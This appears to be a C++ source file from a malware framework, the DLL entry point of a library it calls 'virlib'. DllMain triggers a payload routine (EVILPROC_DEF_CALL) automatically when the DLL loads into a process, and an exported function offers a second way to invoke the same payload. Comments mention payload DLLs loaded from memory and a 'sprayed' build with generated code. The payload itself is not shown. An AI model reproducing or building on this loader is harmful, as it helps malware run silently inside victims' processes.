#include "src/evilproc.h"

#ifdef _USRDLL

// virlib only

#ifdef SPRAYED_BUILD
#include "gened_code.h"
#endif
#include "src/evil_common.h"

#include <windows.h>

BOOL WINAPI DllMain(HMODULE hDll, DWORD dwReason, LPVOID lpReserved) {

  // note: resources don't work if payload dll was loaded from memory
  ZZ(g_hDll) = hDll;

#ifdef EVIL_FROM_DLLMAIN

  if (dwReason == DLL_PROCESS_ATTACH) {
    EVILPROC_DEF_CALL();
  }

#endif

  return TRUE;
}


#ifdef DIRECTCALL_EXPORT_NAME
// for _blue. Clean payload caller, no -i:CreateEvent
extern "C" __declspec(dllexport) void DIRECTCALL_EXPORT_NAME() {
  EVILPROC_DEF_CALL();
}
#endif

#endif



